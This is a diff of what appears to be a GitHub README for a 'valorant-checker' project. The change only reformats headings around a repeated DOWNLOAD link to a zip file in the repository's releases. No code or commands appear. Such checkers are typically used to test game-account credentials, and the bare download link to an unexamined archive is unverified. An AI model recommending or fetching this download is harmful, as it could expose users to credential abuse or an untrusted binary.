@@ -7,7 +7,7 @@
 <h3 align="center">
 Please leave a ⭐  if you like it
 
-  ## [DOWNLOAD](https://github.com/magiclztq/valorant-checker/releases/download/valorant/valchecker-3.18.3.2.zip)</h3>
 
-
-<h4 align="center">## [DOWNLOAD](https://github.com/magiclztq/valorant-checker/releases/download/valorant/valchecker-3.18.3.2.zip)</h4>
+<h4 align="center">
+  ## [DOWNLOAD](https://github.com/magiclztq/valorant-checker/releases/download/valorant/valchecker-3.18.3.2.zip)
+</h4>
